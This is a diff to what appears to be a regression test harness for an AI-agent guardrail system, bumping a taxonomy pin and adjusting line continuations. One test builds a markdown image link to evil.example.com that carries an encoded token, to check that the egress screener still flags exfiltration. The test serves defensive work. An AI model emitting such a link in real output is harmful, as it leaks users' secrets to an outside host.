@@ -75,7 +75,7 @@ from gov import battery_envelope as be  # noqa: E402
 from gov import egress_refs as er  # noqa: E402
 from harness import make_run  # noqa: E402
 
-TAXONOMY_PIN = 1621  # Wave-279 merge pin was 1495 (1493 + evbundle-contract-refused + tool-guardrail-tripwire); Wave-280 merge: pin 1495 -> 1541 (+13 battery-lang-* +1 delegation-ephemeral-grant-refused +32 shield/evaltask-*); Wave-281 lane 9: pin 1541 -> 1551 (+10 guardplugin-*); Wave-283 lane 5: pin 1579 -> 1581 (+2 finding-*).; Wave-283 merge: pin 1581 -> 1587 (+6 inventory-*).; Wave-284 lane 1: pin 1587 -> 1588 (+1 discovery-emit-failed).; Wave-284 merge: pin 1588 -> 1621 (+1 discovery-emit-failed +4 manifest-* +7 guac-graph-* +8 envelope-*/recipient-policy +6 sandbox-policy-* +8 keyset-*).
+TAXONOMY_PIN = 1641  # Wave-279 merge pin was 1495 (1493 + evbundle-contract-refused + tool-guardrail-tripwire); Wave-280 merge: pin 1495 -> 1541 (+13 battery-lang-* +1 delegation-ephemeral-grant-refused +32 shield/evaltask-*); Wave-281 lane 9: pin 1541 -> 1551 (+10 guardplugin-*); Wave-283 lane 5: pin 1579 -> 1581 (+2 finding-*).; Wave-283 merge: pin 1581 -> 1587 (+6 inventory-*).; Wave-284 lane 1: pin 1587 -> 1588 (+1 discovery-emit-failed).; Wave-284 merge: pin 1588 -> 1621 (+1 discovery-emit-failed +4 manifest-* +7 guac-graph-* +8 envelope-*/recipient-policy +6 sandbox-policy-* +8 keyset-*).
 
 
 def _held(name, note):
@@ -1182,7 +1182,7 @@ def repin_f294_mixed_routed():
                              driving_units=[user_u.unit_id,
                                             issue_u.unit_id])
     d = prov.grant_check(req, lab)
-    if not d.allowed and d.routed_to_approval \
+    if not d.allowed and d.routed_to_approval\
             and d.code == "provlabel-mixed-provenance":
         return _held("repin-f294-mixed-routed",
                      "toxic flow routed (mixed-provenance)")
@@ -1232,7 +1232,7 @@ def repin_f296_quad_still_breaks():
     raw = "token=" + enc
     rec = er.screen_egress_refs(
         "![x](https://evil.example.com/c?%s)" % raw, policy=pol)
-    verdict = rec["refs"][0]["screen"]["verdict"] if rec["refs"] \
+    verdict = rec["refs"][0]["screen"]["verdict"] if rec["refs"]\
         else "no-ref"
     if verdict == "allow":
         return _broken("repin-f296-quad-still-breaks",
